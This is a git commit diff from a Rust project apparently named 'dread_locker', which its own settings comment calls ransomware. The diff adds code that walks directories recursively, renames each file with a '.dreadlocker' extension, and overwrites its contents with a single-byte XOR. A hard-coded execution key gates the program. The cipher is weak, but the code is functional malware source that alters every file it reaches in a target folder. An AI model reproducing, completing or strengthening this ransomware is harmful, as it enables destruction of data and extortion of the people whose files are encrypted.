2ecfa26bd7cc654be5e8eceac737bb353908d2cf
DreadFog <quentin.fraty@gmail.com>
2022-08-13 19:46:40 +0200

    Added some tests Added cypher type modularity in Config

--- src/encryption_functions.rs
+++ src/encryption_functions.rs
@@ -1,25 +1,76 @@
-use std::fs;
-use std::io::Read;
+use std::fs::{self, OpenOptions};
+use std::io::{Read, Write, SeekFrom, Seek};
 use std::path::PathBuf;
 use std::process;
-use std::fs::File;
-pub fn encrypt_dir(path: &str) {
-    let file_list = fs::read_dir("/mnt/f/Programming/Rust/dread_locker/test_dir").unwrap_or_else(|err| {
-        eprintln!("Error reading the folder's content");
+pub fn encrypt_dir(path: &str, encryption_type: u8) {
+    let file_list = fs::read_dir(path).unwrap_or_else(|err| {
+        eprintln!("Error reading {}'s content: {}",path, err);
         process::exit(1);
     });
     for file in file_list {
-        println!("Encrypting '{}'", file.as_ref().unwrap().path().display());
-        encrypt_file(file.unwrap().path());
+        let path = file.as_ref().unwrap().path();
+        if let Ok(metadata) = path.metadata() {
+            match metadata.is_file() {
+                true => {
+                    println!("Encrypting '{}'", path.display());
+                    encrypt_file(file.unwrap().path(), encryption_type);
+                },
+                false => {
+                    println!("'{}' is a folder, encrypting...", path.display());
+                    encrypt_dir(&path.into_os_string().into_string().unwrap(), encryption_type);
+                    
+                }
+            }
+        }
+        
     }
 }
 
-fn encrypt_file(file_path: PathBuf) {
-    let mut file = File::open(file_path.clone()).unwrap_or_else(|err| {
+pub fn encrypt_file(file_path: PathBuf, encryption_type: u8) {
+    let mut file = OpenOptions::new()
+    .read(true)
+    .write(true)
+    .create(true)
+    .open(file_path.clone()).unwrap_or_else(|err| {
         eprintln!("Error opening {} : {}", file_path.display(), err);
         process::exit(1);
     });
     let mut contents = String::new();
-    file.read_to_string(&mut contents);
-    println!("Content before encryption: {}", contents);
+    let reading_done = file.read_to_string(&mut contents);
+    if reading_done.is_err() {
+        eprintln!("Error reading {} : {}",file_path.as_path().as_os_str().to_str().unwrap(), reading_done.unwrap());
+    }
+    else {
+        //println!("Content before encryption: {}", contents);
+        match encryption_type {
+            1 => { // TODO: other encryption type
+                println!("Type 1 encryption is not yet implemented. Exiting...");
+                process::exit(0);
+            },
+            _ => { // 0 or anything else => simple XOR
+                rename_file(&file_path);
+                let xor_number: u8 = 5;
+                let mut result: String = String::new();
+                for i in contents.as_bytes().iter(){
+                    let value = *i^xor_number;
+                    // println!("Value : {} towards {}", i, value);
+                    result.push(char::from(value));
+                }
+                file.seek(SeekFrom::Start(0)).unwrap();
+                file.write_all(result.as_bytes()).unwrap_or_else(|err| {
+                    eprintln!("Error overwriting {}: {}. Sufficient permissions?",&file_path.display(), err);
+                });
+            }
+        }
+    }
+    
+}
+
+fn rename_file(file_path: &PathBuf) {
+    let name = file_path.as_path().as_os_str().to_str().unwrap();
+    let mut new_name = String::from(name);
+    new_name.push_str(".dreadlocker");
+    fs::rename(name,new_name).unwrap_or_else(|err| {
+        eprintln!("Error appending the extension to {}: {}", name, err);
+    });
 }
--- src/settings.rs
+++ src/settings.rs
@@ -1,16 +1,31 @@
 pub struct Config{  // Will contain the required configuration for the ransomware to work 
                     // For example: the directory to encrypt
-                    // Or the cypher type to use
+    pub cyphernumber: u8,// Or the cypher type to use
                     // Etc...
 }
 impl Config {
     pub fn new(args: Vec<String>) -> Result<Config, &'static str> {
+        let mut encryption_type: u8 = 0;
+        let zero = "0".to_string();
         if args.len() < 3 || args[1] != "--key"{
             return Err("secure parameter '--key' missing as first argument");
         }
         if args[2].parse::<i32>().unwrap() != 1234 {
             return Err("Invalid execution key ");
         }
-        Ok(Config{})
+        let mut iterable_args = args.iter();
+        if let Some(i) = iterable_args.position(|x| x.trim().to_lowercase() == "--encryption-type"){
+            let encryption_type_str = args.get(i+1).unwrap_or_else(||{
+                println!("Encryption type not found. Defaulting to 0");
+                &zero
+            });
+            encryption_type = encryption_type_str.parse::<u8>().unwrap_or_else(|_|{
+                println!("Encryption type not found. Defaulting to 0");
+                0
+            });
+        }
+        Ok(Config{
+            cyphernumber : encryption_type,
+        })
     }
 }
